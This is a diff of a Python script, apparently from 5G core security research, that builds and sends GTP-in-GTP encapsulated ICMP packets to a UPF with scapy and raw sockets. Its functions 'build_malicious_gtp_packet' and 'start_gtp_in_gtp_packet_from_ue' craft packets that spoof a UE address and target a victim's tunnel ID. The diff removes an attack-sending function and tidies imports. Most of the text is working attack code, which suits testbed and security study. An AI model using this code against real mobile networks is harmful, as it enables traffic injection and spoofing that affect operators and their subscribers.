@@ -1,22 +1,17 @@
-from scapy.all import *
-from scapy.contrib.gtp import *
-from scapy.contrib.pfcp import *
-from scapy.layers.inet import IP, ICMP
-from scapy.layers.l2 import Ether
-from src import *
+from scapy.contrib.gtp import GTP_U_Header
+from scapy.layers.inet import IP, ICMP, UDP
+
+from src.utils.common import ip_list
+
 import sys
 import random
-import time
 import socket
 
 
 def new_seq():
     return random.randint(0, 0xFFFF)
 
-
-def build_encapsulated_gtp_payload(
-    upf_addr, teid_outer, teid_inner, ue_addr, src_addr_ue, src_addr, dst_addr
-):
+def build_encapsulated_gtp_payload(upf_addr, teid_outer, teid_inner, ue_addr, src_addr_ue, src_addr):
 
     icmp_payload = ICMP(type=8, id=0x1234, seq=new_seq())
     ip_payload = IP(src=src_addr_ue, dst=ue_addr) / icmp_payload
@@ -29,29 +24,8 @@ def build_encapsulated_gtp_payload(
 
     return ip_outer
 
-
-def start_gtp_in_gtp_attack(
-    src_addr,
-    upf_addr,
-    teid_outer,
-    teid_inner,
-    ue_addr,
-    src_addr_ue,
-    dst_addr,
-):
-    packet = build_encapsulated_gtp_payload(
-        upf_addr, teid_outer, teid_inner, ue_addr, src_addr_ue, src_addr, dst_addr
-    )
-
-    print(
-        f"[i] Sending GTP-in-GTP packet to {dst_addr} through UPF ({upf_addr}), TEID outer {teid_outer}, TEID inner {teid_inner}, spoofing UE {ue_addr}, source IP {src_addr}"
-    )
-
-    send(packet)
-    print("[+] Packet sent successfully")
-
-
 def build_malicious_gtp_packet(ue_src_addr, ue_dest_addr, victim_teid):
+    
     ip_inbound_payload = IP(src=ue_src_addr, dst=ue_dest_addr) / ICMP(
         type=8, id=0x1234, seq=new_seq()
     )
@@ -67,7 +41,6 @@ def build_malicious_gtp_packet(ue_src_addr, ue_dest_addr, victim_teid):
 
     return ip_packet
 
-
 def start_gtp_in_gtp_packet_from_ue(ue_src_addr, ue_dest_addr, victim_teid, iname):
     s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
     s.bind((iname, 0))
@@ -81,16 +54,10 @@ def start_gtp_in_gtp_packet_from_ue(ue_src_addr, ue_dest_addr, victim_teid, inam
         )
     )
 
+# We used socket because we had issues sending packet with scapy through specific interface 
+# We tried eth layer but it didn't work
 
 if __name__ == "__main__":
-    # if len(sys.argv) != 5:
-    #     print(f"{sys.argv[0]} <ue_src_addr> <ue_dest_addr> <victim_teid> <iname>")
-    # start_gtp_in_gtp_packet_from_ue(
-    #     ue_src_addr=sys.argv[1],
-    #     ue_dest_addr=sys.argv[2],
-    #     victim_teid=int(sys.argv[3], 0),
-    #     iname=sys.argv[4],
-    # )
 
     gtp_packet = (
         IP(src=sys.argv[1], dst=ip_list["UPF"])
